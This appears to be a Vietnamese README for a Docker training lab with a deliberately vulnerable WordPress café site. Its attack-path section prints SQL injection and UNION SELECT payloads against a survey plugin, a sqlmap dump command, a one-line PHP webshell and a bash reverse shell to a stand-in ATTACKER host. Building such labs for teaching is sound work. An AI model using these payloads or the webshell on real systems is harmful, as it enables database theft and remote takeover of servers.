# Lab 04 — SQL Injection (IPMAC Café)

## Kiến trúc

```
┌─────────────────────────────────────────────────────────┐
│  Docker Network: lab04_net                               │
│                                                          │
│  ┌────────────────┐        ┌──────────────────────────┐  │
│  │  landing:80    │        │  nginx:8080              │  │
│  │  (Nginx HTML)  │        │  → proxy → wordpress:80  │  │
│  │  Port 80 →host │        │  Port 8080 → host        │  │
│  └────────────────┘        └──────────────────────────┘  │
│                                    │                     │
│                            ┌───────▼──────────┐          │
│                            │  wordpress:80    │          │
│                            │  (WP 6.4+Apache) │          │
│                            └───────┬──────────┘          │
│                                    │                     │
│                            ┌───────▼──────────┐          │
│                            │  mysql:3306      │          │
│                            │  (MySQL 8.0)     │          │
│                            └──────────────────┘          │
└─────────────────────────────────────────────────────────┘
```

## Khởi động

```bash
./start.sh
# hoặc
docker compose up -d --build
```

## Thêm vào /etc/hosts

```
<YOUR_IP>  cafeipmac.local
```

## Thông tin truy cập

| Target            | URL                                    |
|-------------------|----------------------------------------|
| Landing Page      | http://<IP>:80                         |
| WordPress         | http://cafeipmac.local:8080            |
| WP Admin          | http://cafeipmac.local:8080/wp-admin   |
| Admin credentials | admin / hulabaloo                      |

## Luồng tấn công (Attack Path)

### Bước 1 — Trinh sát
- Truy cập `http://<IP>` → landing page giới thiệu cafe
- Thêm `<IP> cafeipmac.local` vào `/etc/hosts`
- Truy cập `http://cafeipmac.local` → WordPress

### Bước 2 — Phát hiện lỗ hổng
- Plugin **Perfect Survey v1.5.1** đang hoạt động
- Endpoint unauthenticated:
  ```
  GET /wp-admin/admin-ajax.php?action=ps_get_survey_results&surveyId=1
  ```

### Bước 3 — SQL Injection
- Tham số `surveyId` không được sanitize → SQLi thô
- Payload kiểm tra:
  ```
  ?action=ps_get_survey_results&surveyId=1 OR 1=1--
  ```
- Khai thác UNION SELECT để đọc `wp_users`:
  ```
  ?action=ps_get_survey_results&surveyId=0 UNION SELECT 1,user_login,user_pass,4,5 FROM wp_users--
  ```
- sqlmap:
  ```bash
  sqlmap -u "http://cafeipmac.local:8080/wp-admin/admin-ajax.php?action=ps_get_survey_results&surveyId=1" \
         --level=3 --risk=2 --dump -T wp_users
  ```

### Bước 4 — Crack hash & Đăng nhập Admin
- Hash: `$P$B...` (WordPress phpassword)
- Crack bằng hashcat / john
- Hoặc dùng tài khoản đã biết: `admin / hulabaloo`

### Bước 5 — RCE qua Plugin Upload
1. Đăng nhập `/wp-admin`
2. Vào **Plugins → Add New → Upload Plugin**
3. Upload plugin ZIP chứa webshell PHP:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Kích hoạt → truy cập webshell
5. Reverse shell:
   ```
   /wp-content/plugins/shell/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
   ```

## Các chức năng không bị lỗi SQLi (red herrings)

| Chức năng         | URL                    | Ghi chú                    |
|-------------------|------------------------|----------------------------|
| Đặt bàn (CF7)     | /dat-ban               | Dùng `prepare()` an toàn   |
| Trang chủ WP      | /                      | Static, không query động   |
| Thực đơn WC       | /thuc-don              | WooCommerce, an toàn       |
| Về chúng tôi      | /ve-chung-toi          | Static page                |
| Gửi câu trả lời   | ps_submit_answer AJAX  | Dùng `sanitize_text_field` |

## Dừng lab

```bash
docker compose down
docker compose down -v  # xóa cả database
```
